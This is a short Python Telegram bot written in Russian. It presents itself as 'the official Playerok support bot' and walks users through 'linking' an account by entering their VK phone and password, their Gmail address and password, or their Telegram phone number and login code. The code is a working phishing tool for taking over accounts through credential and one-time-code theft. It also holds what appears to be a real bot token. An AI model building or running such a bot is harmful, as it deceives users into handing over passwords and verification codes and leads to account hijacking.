import telebot
import os

TOKEN = os.getenv("8658778007:AAE6fWeQvnLtNxFJMD7phj7nWaytwhnA3TI")
bot = telebot.TeleBot(TOKEN)

state = {}

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "Здравствуйте!\n\n"
        "Это официальный бот поддержки Playerok.\n\n"
        "Выберите способ привязки:\n\n"
        "/vk — ВКонтакте\n"
        "/gmail — Gmail\n"
        "/tg — Telegram"
    )

# --- VK ---
@bot.message_handler(commands=['vk'])
def vk(message):
    state[message.chat.id] = "vk_phone"
    bot.send_message(message.chat.id, "Вы выбрали ВКонтакте.\n\nВведите номер телефона VK и пароль:")

# --- GMAIL ---
@bot.message_handler(commands=['gmail'])
def gmail(message):
    state[message.chat.id] = "gmail_email"
    bot.send_message(message.chat.id, "Вы выбрали Gmail.\n\nВведите email и пароль:")

# --- TELEGRAM ---
@bot.message_handler(commands=['tg'])
def tg(message):
    state[message.chat.id] = "tg_username"
    bot.send_message(message.chat.id, "Вы выбрали Telegram.\n\nВведите ваш номер телефона и продиктуйте код:")

# --- ОБРАБОТКА ---
@bot.message_handler(func=lambda message: True)
def handle(message):
    s = state.get(message.chat.id)

    if s == "vk_phone":
        state[message.chat.id] = "vk_code"
        bot.send_message(message.chat.id, "Введите код подтверждения:")

    elif s == "vk_code":
        state[message.chat.id] = None
        bot.send_message(message.chat.id, "Спасибо. Ожидайте...")

    elif s == "gmail_email":
        state[message.chat.id] = "gmail_pass"
        bot.send_message(message.chat.id, "Введите пароль:")

    elif s == "gmail_pass":
        state[message.chat.id] = None
        bot.send_message(message.chat.id, "Спасибо. Ожидайте...")

    elif s == "tg_username":
        state[message.chat.id] = "tg_code"
        bot.send_message(message.chat.id, "Введите код подтверждения:")

    elif s == "tg_code":
        state[message.chat.id] = None
        bot.send_message(message.chat.id, "Спасибо. Ожидайте...")

bot.infinity_polling()
